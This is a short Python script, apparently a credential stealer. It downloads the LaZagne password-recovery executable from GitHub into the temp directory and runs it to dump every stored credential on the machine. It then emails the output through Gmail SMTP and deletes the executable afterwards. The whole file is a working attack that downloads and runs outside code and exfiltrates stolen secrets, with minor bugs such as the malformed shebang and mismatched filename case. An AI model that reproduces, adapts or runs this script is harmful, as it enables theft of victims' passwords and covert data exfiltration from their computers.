#!usr/bin/env python


import requests
import subprocess
import smtplib
import os
import tempfile


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587,)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "w") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail('mail', 'password', result)
os.remove("laZagne.exe")
